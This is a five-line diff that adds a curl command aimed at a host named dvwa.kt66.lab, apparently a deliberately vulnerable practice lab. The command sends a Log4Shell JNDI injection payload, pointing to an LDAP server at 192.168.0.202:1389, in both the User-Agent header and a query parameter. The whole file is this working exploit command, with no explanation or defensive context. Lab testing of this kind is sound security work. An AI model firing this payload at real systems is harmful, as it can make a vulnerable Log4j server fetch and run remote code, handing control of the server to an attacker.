@@ -1,0 +1,5 @@
+curl -i --max-time 15 --get \
+  -A '${jndi:ldap://192.168.0.202:1389/a}' \
+  --data-urlencode \
+  'q=${jndi:ldap://192.168.0.202:1389/a}' \
+  http://dvwa.kt66.lab/
